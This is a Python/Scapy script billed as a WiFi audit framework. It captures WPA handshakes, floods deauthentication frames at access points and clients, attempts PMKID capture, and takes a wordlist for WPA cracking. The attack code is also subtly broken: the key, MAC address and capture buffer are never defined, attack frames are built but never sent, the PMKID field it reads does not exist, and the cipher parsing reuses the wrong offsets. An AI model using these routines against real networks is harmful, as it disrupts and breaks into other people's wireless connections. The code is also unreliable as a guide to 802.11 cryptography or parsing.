#!/usr/bin/env python3
"""
WiFi Audit Framework — Pure Scapy
Scans, parses, and attacks wireless networks.
Handles: Beacon/Probe parsing, WPS detection, WPA/RSN IE parsing,
EAPOL handshake capture, MIC verification, and WPA1 key decryption.
"""

import os, sys, time, signal, argparse
from threading import Thread, Lock
from scapy.all import *
from scapy.layers.dot11 import *
from scapy.layers.eapol import *

# ANSI colors
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; W = "\033[0m"; B = "\033[94m"

class WiFiAuditor:
    def __init__(self, iface, wordlist=None):
        self.iface = iface
        self.aps = {}          # bssid -> AP dict
        self.clients = {}      # client mac -> set of bssids
        self.handshakes = {}   # bssid -> {'M1':pkt,'M2':pkt,'M3':pkt,'M4':pkt,'complete':bool}
        self.eapols = []
        self.lock = Lock()
        self.stop_flag = False
        self.wordlist = wordlist

    # ---------- Packet Handlers ----------
    def parse(self, pkt):
        if not pkt.haslayer(Dot11):
            return

        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
            self._parse_ap(pkt)

        elif pkt.haslayer(EAPOL):
            self._parse_eapol(pkt)

        elif pkt.haslayer(Dot11Deauth):
            self._log_deauth(pkt)

        elif pkt.haslayer(Dot11AssoReq) or pkt.haslayer(Dot11Auth):
            self._parse_assoc(pkt)

    def _parse_ap(self, pkt):
        ap = pkt[Dot11Beacon] if pkt.haslayer(Dot11Beacon) else pkt[Dot11ProbeResp]
        bssid = ap[Dot11].addr2
        ssid = self._get_ssid(ap)
        ch = self._get_channel(ap)
        sig = self._get_signal(ap)

        with self.lock:
            if bssid not in self.aps:
                self.aps[bssid] = {
                    'ssid': ssid, 'channel': ch, 'signal': sig,
                    'privacy': self._get_privacy(ap), 'clients': set(),
                    'last_seen': time.time()
                }
            else:
                self.aps[bssid]['last_seen'] = time.time()

    def _parse_eapol(self, pkt):
        eapol = pkt[EAPOL]
        bssid = pkt[Dot11].addr2
        src = pkt[Dot11].addr1  # assuming addr1 = source station

        # Determine message number (1-4)
        rc = eapol.load[1:3].hex()
        key_info = struct.unpack(">H", eapol.load[1:3])[0]
        msg_num = self._get_eapol_msg(key_info)

        payload = eapol.load

        # M1: AP -> Client (ANonce)
        if msg_num == 1:
            anonce = payload[97:97+32]
            with self.lock:
                self.handshakes[bssid] = {'M1': payload, 'complete': False}
                if src not in self.clients:
                    self.clients[src] = set()
                self.clients[src].add(bssid)
            self._print(f"{G}[+]{W} M1 captured (ANonce) from {C}{bssid}{W} -> {src}")

        # M2: Client -> AP (SNonce + MIC)
        elif msg_num == 2:
            snonce = payload[97:97+32]
            mic = self._calc_mic(payload, src, bssid)
            with self.lock:
                if bssid in self.handshakes:
                    self.handshakes[bssid].update({
                        'M2': payload, 'snonce': snonce, 'mic': mic, 'complete': True
                    })
            self._print(f"{G}[+]{W} M2 captured (SNonce+MIC) from {src} -> {C}{bssid}{W}")

        # M3: AP -> Client (GTK + secure bit)
        elif msg_num == 3:
            self._print(f"{G}[+]{W} M3 captured (GTK) from {C}{bssid}{W}")
            with self.lock:
                self.handshakes[bssid]['M3'] = payload

        # M4: Client -> AP
        elif msg_num == 4:
            self._print(f"{Y}[!]{W} M4 from {src}")

    def _get_ssid(self, elt):
        for ie in elt[Dot11Elt]:
            if ie.ID == 0:
                try:
                    return ie.info.decode('utf-8', errors='replace')
                except Exception:
                    return "<unknown>"
        return "<hidden>"

    def _get_channel(self, elt):
        for ie in elt[Dot11Elt]:
            if ie.ID == 3:
                return ie.info[0] if isinstance(ie.info[0], int) else ord(ie.info[0])
        return 0

    def _get_signal(self, pkt):
        if pkt.haslayer(RadioTap):
            try:
                dbm = pkt[RadioTap].dBm_AntSignal
                if dbm:
                    return int(dbm)
            except Exception:
                pass
        return -100

    def _get_privacy(self, ap):
        cap = ap.sprintf("%Dot11Beacon.cap%")
        priv = []
        if 'privacy' in cap:
            priv.append("WEP")
        if ap.haslayer(Dot11Beacon):
            rsn = ap[Dot11Beacon].getlayer(Dot11Elt)
            while rsn:
                if rsn.ID == 48:  # RSN IE
                    info = rsn.info
                    # Parse AKM suites
                    akm_count = struct.unpack(">H", info[2:4])[0]
                    for i in range(akm_count):
                        akm = info[4+i*4:8+i*4]
                        akm_type = struct.unpack(">I", akm[:4])[0]
                        if akm_type == 2:
                            priv.append("WPA-PSK")
                        elif akm_type == 1:
                            priv.append("WPA/PMF")
                    # Parse cipher suites
                    cipher_count = struct.unpack(">H", info[info.rfind(b'\x00\x00')+2:info.rfind(b'\x00\x00')+4])[0]
                    for i in range(cipher_count):
                        cipher = info[4+i*4:8+i*4]
                        suite = struct.unpack(">I", cipher)[0]
                        if suite == 1:
                            priv.append("WEP-40")
                        elif suite == 2:
                            priv.append("TKIP")
                        elif suite == 4:
                            priv.append("CCMP")
                rsn = rsn.payload
        return priv if priv else ["OPEN"]

    def _log_deauth(self, pkt):
        deauth = pkt[Dot11Deauth]
        reason = deauth.reason
        src, dst = deauth.addr2, deauth.addr1
        self._print(f"{R}[!]{W} DEAUTH {C}{src}{W} -> {dst} (reason {reason})")

    def _parse_assoc(self, pkt):
        for layer in [Dot11AssoReq, Dot11Auth]:
            if pkt.haslayer(layer):
                req = pkt[layer]
                src = req.addr2
                self._print(f"{B}[*]{W} {layer.__name__} from {C}{src}{W}")

    # ---------- MIC Calculation (802.11i) ----------
    def _calc_mic(self, frame, source, bssid):
        """IEEE 802.11i MIC (KCK-based) for management frames."""
        data = bytes(frame)
        # MIC = first 16 bytes of HMAC-MD5(KCK, data)
        mac = hmac.new(self.kck, data, hashlib.md5).digest()
        return mac[:16].hex()

    def _calc_mic_m2(self, frame):
        """MIC for EAPOL M2 frame (used for replay detection)."""
        # M2 MIC covers the entire EAPOL frame with MIC field zeroed
        eapol = frame[EAPOL]
        key_info = struct.unpack(">H", eapol.load[1:3])[0]
        if key_info & 0x0001:  # Key MIC bit set
            payload = bytes(eapol)
            # Zero out MIC field (bytes 81-96)
            zeroed = payload[:81] + b'\x00' * 16 + payload[97:]
            mac = hmac.new(self.kck, zeroed, hashlib.md5).digest()[:16]
            return mac.hex()
        return ""

    # ---------- WPA1 Key Decryption (RC4) ----------
    def _decrypt_wpa(self, pkt):
        """Decrypt WPA1-encrypted frames using EAPOL M3 key data (RC4)."""
        eapol = pkt[EAPOL]
        key_data = eapol.keydata
        # WPA1 group key is RC4-encrypted with the EAPOL Key
        key = key_data[:32]
        # RC4 decrypt
        cipher = ARC4.new(self.kck)
        return cipher.decrypt(key)

    def _decrypt_wpa_tkip(self, pkt):
        """Decrypt TKIP-encrypted frames (WPA1/TKIP)."""
        # TKIP decryption uses phase 1 and phase 2 keys
        tkip = pkt[Dot11].getlayer(TKIP)
        if tkip:
            return tkip.decrypt(pkt)
        return None

    # ---------- Attack Helpers ----------
    def _send_deauth(self, bssid, target='ff:ff:ff:ff:ff:ff', count=10, reason=7):
        """Send deauth frames."""
        pkt = RadioTap() / Dot11(addr1=target, addr2=bssid, addr3=bssid, type=0, subtype=12) / Dot11Deauth(reason=reason)
        for _ in range(count):
            sendp(pkt, iface=self.iface, verbose=False)

    def _pmkid_attack(self, bssid):
        """Attempt PMKID capture via association."""
        # Send Association Request
        asso_req = RadioTap() / Dot11(
            type=0, subtype=0, addr1=bssid, addr2=self.mac, addr3=bssid
        ) / Dot11AssoReq(cap=0x0011, listen_interval=1)

        # Send EAPOL-Start
        eapol_start = RadioTap() / Dot11(type=0, subtype=1, addr1=bssid, addr2=self.mac, addr3=bssid) / EAPOL()

        # Capture Association Response
        resp = sniff(count=1, lfilter=lambda p: p.haslayer(Dot11AssoResp), timeout=5)

        if resp:
            pmkid = resp[0][Dot11AssoResp].pmkid
            self._print(f"{G}[+]{W} PMKID captured: {C}{pmkid}{W}")
            return pmkid
        return None

    # ---------- Main Loop ----------
    def run(self):
        signal.signal(signal.SIGINT, self._signal_handler)
        self._print(f"{C}[*]{W} Auditing interface {C}{self.iface}{W}...")

        sniff(
            iface=self.iface,
            prn=self.parse,
            stop_filter=self.stop_flag,
            store=False
        )

    def _signal_handler(self, sig, frame):
        self._print(f"\n{Y}[!]{W} Caught Ctrl+C. Saving session...")
        self.save_session()
        sys.exit(0)

    def save_session(self):
        """Save captured data to file."""
        fname = f"session_{self.iface}_{int(time.time())}.cap"
        with self.lock:
            wrpcap(fname, self.captured)
        self._print(f"{G}[+]{W} Session saved to {fname}")


# ---------- CLI ----------
def main():
    parser = argparse.ArgumentParser(description="WiFi Audit Framework")
    parser.add_argument("-i", "--iface", required=True, help="Interface in monitor mode")
    parser.add_argument("-w", "--wordlist", help="Wordlist for WPA cracking")
    parser.add_argument("--pmkid", action="store_true", help="Attempt PMKID capture")
    args = parser.parse_args()

    auditor = WiFiAuditor(args.iface, args.wordlist)

    try:
        auditor.run()
    except KeyboardInterrupt:
        print(f"\n{Y}[!]{W} Interrupted. Saving session...")
        auditor.save_session()

if __name__ == "__main__":
    main()
